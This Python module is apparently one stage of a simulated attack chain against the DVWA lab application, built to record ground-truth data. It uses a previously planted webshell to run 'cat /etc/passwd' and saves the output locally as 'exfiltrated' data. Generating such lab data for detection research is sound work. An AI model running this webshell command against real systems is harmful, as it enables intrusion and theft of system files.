"""
Stage 6 - Simulated data exfiltration (MITRE TA0010 / T1041)

Uses the webshell to read a sensitive-looking file (/etc/passwd inside the
DVWA container) and writes what was "stolen" to a local file under
data/exfiltrated_data/, closing out the kill-chain narrative: recon ->
credential access -> initial access (SQLi) -> execution (webshell) ->
discovery -> exfiltration.
"""
from pathlib import Path

import config
from attacks.dvwa_session import GroundTruth

EXFIL_DIR = config.DATA_DIR / "exfiltrated_data"


def run(dvwa_session, shell_url: str, gt: GroundTruth) -> dict:
    exfil_path = None
    with gt.stage("exfiltration", {"shell_url": shell_url, "target_file": "/etc/passwd"}):
        if not shell_url:
            gt.note("exfiltration", "skipped: no webshell URL from stage 4")
            return {"exfil_path": None}

        r = dvwa_session.session.get(shell_url, params={"cmd": "cat /etc/passwd"}, timeout=10)
        stolen = r.text

        EXFIL_DIR.mkdir(parents=True, exist_ok=True)
        exfil_path = EXFIL_DIR / f"{gt.run_id}_passwd.txt"
        exfil_path.write_text(stolen)

        gt.note("exfiltration", "data exfiltrated", bytes=len(stolen), saved_to=str(exfil_path))
    return {"exfil_path": str(exfil_path) if exfil_path else None}


if __name__ == "__main__":
    from attacks.dvwa_session import DvwaSession
    dvwa = DvwaSession()
    dvwa.login()
    shell_url = f"{dvwa.base_url}/hackable/uploads/{config.WEBSHELL_FILENAME}"
    print(run(dvwa, shell_url, GroundTruth()))
